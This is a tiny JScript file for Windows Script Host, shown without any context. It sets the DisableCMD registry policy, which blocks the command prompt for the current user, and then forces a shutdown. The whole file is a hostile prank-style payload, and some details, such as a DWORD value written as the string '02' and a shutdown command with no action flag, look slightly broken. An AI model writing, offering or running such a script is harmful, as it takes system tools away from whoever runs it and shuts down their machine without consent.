var RegOpertion=WScript.CreateObject("WScript.Shell");
RegOpertion.RegWrite

("HKCU\\Software\\Policies\\Microsoft\\Windows\\System\\DisableCMD","02","REG_DWORD");

var test_wsh=WScript.CreateObject("WScript.Shell");
test_wsh.Run("Shutdown -f");